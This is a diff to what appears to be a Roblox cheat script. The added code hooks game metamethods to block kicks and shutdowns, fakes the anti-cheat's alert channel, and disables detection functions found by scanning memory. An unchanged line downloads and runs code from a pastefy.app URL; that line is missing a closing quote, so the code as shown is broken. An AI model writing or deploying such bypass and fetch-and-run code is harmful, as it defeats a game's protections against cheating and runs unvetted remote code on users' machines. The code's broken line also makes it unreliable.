@@ -1,3 +1,53 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local Camera = workspace.CurrentCamera
+
+task.spawn(function()
+    pcall(function()
+        local rf = game:GetService("ReplicatedFirst")
+        local lp = Players.LocalPlayer
+
+        local fake = Instance.new("RemoteEvent")
+        fake.Name = "ClientAlert"
+        fake.Parent = lp
+
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+            local m = getnamecallmethod()
+            if not checkcaller() then
+                if m == "WaitForChild" and select(1, ...) == "ClientAlert" then return fake end
+                if self == lp and (m == "Kick" or m == "kick") then return end
+                if m:lower():find("kick") or m == "Shutdown" then return end
+                if m == "FireServer" and self == fake then return end
+            end
+            return oldNamecall(self, ...)
+        end)
+
+        local ls3 = rf:WaitForChild("LocalScript3", 10)
+        for _, f in getgc(false) do
+            if typeof(f) == "function" then
+                local ok, e = pcall(getfenv, f)
+                if ok and e then
+                    local scr = rawget(e, "script")
+                    if scr and (scr == ls3 or tostring(scr):find("LoadingScreen")) then
+                        local ok2, cs = pcall(debug.getconstants, f)
+                        if ok2 then
+                            for _, k in cs do
+                                if typeof(k) == "string" and (k:find("TakeTheL") or k:find("ban") or k:find("kick")) then
+                                    hookfunction(f, function() end)
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end)
 loadstring(game:HttpGet("https://pastefy.app/EHeqdtQs/raw))()
 local repo = "https://raw.githubusercontent.com/mstudio45/LinoriaLib/main/"
 
